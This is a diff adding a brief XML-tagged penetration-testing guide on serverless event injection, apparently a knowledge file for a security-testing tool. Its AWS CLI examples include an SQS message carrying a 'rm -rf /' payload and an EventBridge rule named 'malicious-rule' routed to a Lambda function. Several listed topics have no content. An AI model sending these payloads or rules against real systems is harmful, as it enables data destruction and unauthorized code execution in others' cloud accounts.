@@ -1,0 +1,45 @@
+<serverless_event_injection_guide>
+<title>SERVERLESS EVENT INJECTION</title>
+
+<critical>Serverless event injection attacks target SNS/SQS, EventBridge, Pub/Sub, and Azure Event Grid. Testing focuses on message injection, privilege escalation, and dead letter queue exploitation.</critical>
+
+<scope>
+- SNS/SQS message injection
+- EventBridge exploitation
+- GCP Pub/Sub security
+- Azure Event Grid attacks
+- Lambda event source mapping
+- Cross-service privilege escalation
+- Dead letter queue exploitation
+</scope>
+
+<sns_sqs_injection>
+{% raw %}
+# SQS message injection:
+aws sqs send-message \
+  --queue-url https://sqs.region.amazonaws.com/account/queue \
+  --message-body '{"command":"rm -rf /"}'
+
+# SNS injection:
+aws sns publish \
+  --topic-arn arn:aws:sns:region:account:topic \
+  --message '{"attack":"payload"}'
+{% endraw %}
+</sns_sqs_injection>
+
+<eventbridge_exploitation>
+{% raw %}
+# EventBridge rule injection:
+aws events put-rule \
+  --name malicious-rule \
+  --event-pattern '{"source":["aws.ec2"]}'
+
+# Put target:
+aws events put-targets \
+  --rule malicious-rule \
+  --targets "Id=1,Arn=arn:aws:lambda:region:account:function:target"
+{% endraw %}
+</eventbridge_exploitation>
+
+<remember>Serverless events: Test message injection in queues/topics, validate event source authentication, check for privilege escalation via event routing, examine dead letter queues for sensitive data.</remember>
+</serverless_event_injection_guide>
